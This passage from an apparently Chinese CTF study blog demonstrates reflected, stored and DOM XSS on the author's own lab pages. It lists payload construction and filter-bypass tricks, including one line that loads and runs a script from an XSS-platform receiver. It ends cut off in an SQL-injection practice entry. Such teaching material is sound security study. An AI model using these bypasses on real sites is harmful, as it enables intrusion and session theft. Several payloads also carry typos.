class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">style</span>=<span class="string">&quot;border:0px&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/x-scriptlet&quot;</span> <span class="attr">data</span>=<span class="string">&quot;http://xss.tv/themes/default/templates/head.html&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">50</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎用户<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alear</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level1.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:29<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">​```</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">style</span>=<span class="string">&quot;border:0px&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/x-scriptlet&quot;</span> <span class="attr">data</span>=<span class="string">&quot;http://xss.tv/themes/default/templates/head.html&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">50</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎用户<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alear</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level1.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>payload的长度:29<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-3-存储型XSS漏洞验证"><a href="#2-3-存储型XSS漏洞验证" class="headerlink" title="2.3 存储型XSS漏洞验证"></a>2.3 存储型XSS漏洞验证</h4><p>1.存储型XSS漏洞常存在于数据库内容中，如留言板等。此处利用之前搭建的论坛网站的留言功能作为实验平台，该平台的搭建过程参考《搭建一个简单丑陋的论坛网站》。</p><p>2.我们登录访问该网站，使用我们之前住过的账号a，密码也是a。登录后返回首页，点击“我要留言”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b39581d616897a54fe045a63b9657578.png" alt="在这里插入图片描述"></p><p>3.使用留言功能，留下如下的内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>。点击提交</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dc42c41f2f5ffcec651230c24bd4b392.png" alt="在这里插入图片描述"></p><p>4.再次返回首页，可以看到刚刚留下的留言。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/bda571b91a1247a35e7903c73f71b401.png" alt="在这里插入图片描述"></p><p>5.点击该留言，出现弹窗，这就是存储型XSS漏洞。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eee6bfe2aa0150f1831e2a24541e3f95.png" alt="在这里插入图片描述"></p><p>6.右键该页面，查看网页源码，如下.我们看到因为我们搭建的平台没有对输入输出内容做任何的检验与过滤，导致这种异常的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span> = <span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言论坛<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>留言内容<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;../index.php&#x27;</span>&gt;</span>返回首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line">作者：a<span class="tag">&lt;<span class="name">br</span>&gt;</span>标题：存储型XSS<span class="tag">&lt;<span class="name">hr</span> /&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-4-DOM型XSS漏洞验证"><a href="#2-4-DOM型XSS漏洞验证" class="headerlink" title="2.4 DOM型XSS漏洞验证"></a>2.4 DOM型XSS漏洞验证</h4><p>1.暂时没有找到什么平台适合测试，就找到了一段代码，我们将其存在phpstudy网站的根目录下的dom.php文件中，稍后进行测试。该代码中的script标签内的内容意思是，定义一个变量a并赋值为URL，为a解码，将message=后面的内容写入到DOM树中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM-XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span>&gt;</span>charset=&quot;utf-8&quot;&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">heaf</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="property">URL</span>;</span></span><br><span class="line"><span class="language-javascript">a = <span class="built_in">unescape</span>(a);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(a.<span class="title function_">substring</span>(a.<span class="title function_">indexOf</span>(<span class="string">&quot;message=&quot;</span>)+<span class="number">8</span>,a.<span class="property">length</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bofy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.我们通过浏览器访问该网页，因为我们还没有给URL传递参数message，此处将内容以存文本的形式输出。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5a50997dbfd1b77fe59c2e513d4e20af.png" alt="在这里插入图片描述"></p><p>3.修改参数为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>，回车时则出现弹窗。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/545abeca38ac665bd35dc4d4030b8a2f.png" alt="在这里插入图片描述"></p><p>4.我们右键查看源代码，发现代码与刚刚编写的一致，并没有弹窗的内容。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/873507b95133cffa23e7e8c2c7022087.png" alt="在这里插入图片描述"></p><p>5.审查网页元素，则可以看到DOM树这里多出了个弹窗内容，就是上述document语句修改生成的。（有的浏览器查看结果有区别，可以试试不同浏览器的解析结果）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/36c018381f067a48d5a2457d4e30fd07.png" alt="在这里插入图片描述"></p><h2 id="3-XSS语句构造与绕过"><a href="#3-XSS语句构造与绕过" class="headerlink" title="3 XSS语句构造与绕过"></a>3 XSS语句构造与绕过</h2><h4 id="3-1-XSS语句构造方式"><a href="#3-1-XSS语句构造方式" class="headerlink" title="3.1 XSS语句构造方式"></a>3.1 XSS语句构造方式</h4><p>第一种：可以利用[&lt;&gt;]构造HTML/JS语句，如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第二种：可以利用javascript:伪协议的方式构造XSS。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;touch me&lt;/a&gt; <span class="comment">//利用a标签的javascript:伪协议</span></span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span> &gt; //利用img标签的javascript:伪协议，但是这种方式在IE6下测试成功，在IE8失败</span><br><span class="line">javascript:$<span class="selector-class">.getScript</span>(<span class="string">&quot;XSS平台接收网址&quot;</span>)   <span class="comment">//jQuery 的 $.getScript() 函数用来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</span></span><br></pre></td></tr></table></figure><p>第三种：事件驱动：事件驱动是一种比较经典的编程思想。在网页内会发生很多事件（比如鼠标移动，键盘输入等），JS可以对此类事件进行响应，因此我们可以通过事件触发JS函数，触发XSS。事件种类主要有以下几种。<br>1.Windows事件：对Windows对象触发的事件；<br>2.Form事件：HTML表单内的动作触发事件；<br>3.keyboard事件：键盘按键；<br>4.Mouse事件：有鼠标或类似用户动作触发的事件；<br>5.Media事件：由多媒体触发的事件。</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;./smile.jpg&#x27;</span> onmouseover=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;<span class="comment">//该标签会引入一张图片，然后鼠标悬停在图片上的时候，会触发XSS代码。</span></span><br><span class="line">&lt;img src=<span class="string">&#x27;./smile.jpg&#x27;</span> <span class="keyword">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;<span class="comment">//onerror会在文档载入失败时触发XSS，比如下一个语句</span></span><br><span class="line">&lt;img src=<span class="string">&#x27;#&#x27;</span> <span class="keyword">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;<span class="comment">//与上一个语句相比，将文件路径改成#，一定载入失败，触发XSS</span></span><br><span class="line">&lt;<span class="keyword">input</span> type=<span class="string">&quot;text&quot;</span> onkeydown=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;<span class="comment">//单行文本框的键盘点击事件，当点击键盘任一按键时触发XSS。</span></span><br><span class="line">&lt;<span class="keyword">input</span> type=<span class="string">&quot;text&quot;</span> onkeyup=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> type=<span class="string">&quot;button&quot;</span> <span class="keyword">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>第四种：是利用CSS（层叠样式脚本）触发XSS的，该方法比较古老，现已基本不适用于主流浏览器，以下代码均在IE6下进行测试。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 行内样式</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span> = <span class="string">&quot;backgroud-image:url(javascript:alert(/xss/))&quot;</span>&gt;</span></span><br><span class="line">//页内样式</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">Body</span>&#123;backgroud-<span class="selector-tag">image</span>:<span class="built_in">url</span>(<span class="string">javascript:alert(/xss/</span>))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">//外部样式</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./xss.css&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">//其中xss.css文本内容如下</span><br><span class="line">h1 &#123;color:red;&#125;</span><br><span class="line">div&#123;</span><br><span class="line">/*width:expression(alert(/xss/))*/</span><br><span class="line">backgroud-image:url(javascript:alert(/xss/))</span><br><span class="line">&#125;</span><br><span class="line">@ expression</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(/xss/))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">Body</span>&#123;backgroud-<span class="selector-tag">image</span>:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/xss/));&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">@import</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="keyword">@import</span> <span class="string">&#x27;javascript:alert(&quot;xss&quot;)&#x27;</span>;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="keyword">@import</span> url(xss.css);</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>HELLO<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5.其他标签及手法，利用一些比较新的前端标签进行构造。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg <span class="attribute">onload</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span><br><span class="line">&lt;input <span class="attribute">onfocus</span>=alert(xss/) autofocus&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-变形及绕过方式"><a href="#3-2-变形及绕过方式" class="headerlink" title="3.2 变形及绕过方式"></a>3.2 变形及绕过方式</h4><p>0.目的：我们可以将构造的XSS代码进行各种变形，以绕过XSS过滤器检测。<br>第一种：大小写混编<br>可以将payload进行大小写混编，如以下例子。例子中包含两种语言，其中html语言对大小写不敏感，也就是说无论是大小写，该语言都认为是同一个函数；但是JS语言对大小写敏感，比如alert()函数，如果改为Alert()，JS语言则认为是另一个东西。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">Src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>//由<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">οnerrοr</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>变形得到的</span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">Href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me<span class="tag">&lt;/<span class="name">a</span>&gt;</span>//由<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me<span class="tag">&lt;/<span class="name">a</span>&gt;</span>变形得到的</span><br></pre></td></tr></table></figure><p>第二种：双写绕过。当发现过滤器仅进行一次过滤时并将一些关键字过滤为空，则可以使用双写绕过。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/scr</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>ipt&gt;</span><br></pre></td></tr></table></figure><p>第三种：引号的使用<br>HTML语言中对引号的使用不敏感，但是有些过滤函数则对引号时锱铢必较的，因此我们可以使用不同引号来闭合XSS语句。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下三种均可能成功触发XSS，具体能否注入就看过滤是如何过滤的了。</span></span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="string">&quot;#&quot;</span> onerror=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="string">&#x27;#&#x27;</span> onerror=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=# onerror=<span class="built_in">alert</span>(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>第四种：使用 [/]或者/**/ 代替空格，如：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&#x27;#&#x27;/onerror=&#x27;alert(<span class="name">/xss/</span>)&#x27;&gt;</span><br></pre></td></tr></table></figure><p>第五种：在一些关键字内，可以插入回车符与Tab符来绕过关键字检测。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>//有时候tab符插在关键字内会失效。</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;ja</span></span></span><br><span class="line"><span class="string"><span class="tag">vascript:alert(/xss/)&quot;</span>&gt;</span>touch me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果过滤了script，可以使用大小写绕过，如sCRiPt</p><p>第六种：<br>1.编码绕过。可以对标签属性值进行转码，来实现绕过在，转码后的要加分号。<br>字符a，对应ASCII码97，十进制编码&amp;#97，十六进制编码&amp;#x61。<br>字符e，对应ASCII码101，十进制编码&amp;#101，十六进制编码&amp;#x65。<br>2.另外，可以将以下字符插入到任意位置中：<br>Tab ==&gt; &amp;#9<br>换行 ==&gt; &amp;#10<br>回车 ==&gt; &amp;#13<br>3.可以将以下字符插入到头部位置。<br>SOH ==&gt; &amp;#01<br>STX ==&gt; &amp;#01<br>转码后例子如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#x61;</span>script:laert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>//经过简单编码</span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#01;</span>j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#x61;</span>s<span class="symbol">&amp;#9;</span>c<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:laert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>//经过插入字符</span><br></pre></td></tr></table></figure><p>第七种：拆分跨站，将语句才分成多个，拼串起来后再执行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=<span class="string">&#x27;alert&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=z+<span class="string">&#x27;(/xss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//ecal为执行函数，将后续的字符串当成语句执行。</span><br></pre></td></tr></table></figure><p>第八种：CSS中的变形。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">width: ｅｘｐｒｅｓｓｉｏｎ（alert(<span class="regexp">/xss/</span>)）<span class="comment">//使用全角字符</span></span><br><span class="line">width:expre<span class="comment">/**/</span>ssion(alert(<span class="regexp">/xss/</span>))<span class="comment">//注释会被浏览器忽略</span></span><br><span class="line"></span><br><span class="line">&lt;style&gt;@<span class="keyword">import</span> <span class="string">&#x27;javas\cri\0pt:alert(/xss/)&#x27;</span>;&lt;<span class="regexp">/style&gt;/</span>/插入 \ 和 \<span class="number">0</span> 符号</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4e70d466a031eaf51d182023d68f3ba3.jpg" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e7ce9999bf5100125559bd6a2675bbef.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.10.28</title>
      <link href="/posts/9eb3c9ef.html"/>
      <url>/posts/9eb3c9ef.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h4 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028214432589.png" alt="image-20241028214432589"></p><blockquote><p>看到源码了，直接sql一套秒了</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028214411807.png" alt="image-20241028214411807"></p><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028214614401.png" alt="image-20241028214614401"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028215453005.png" alt="image-20241028215453005"></p><h4 id="SQL-报错注入"><a href="#SQL-报错注入" class="headerlink" title="SQL 报错注入"></a>SQL 报错注入</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028215607907.png" alt="image-20241028215607907"></p><blockquote><p>构造payload</p><p>1 and (select extractvalue(1,concat(‘~’,(select 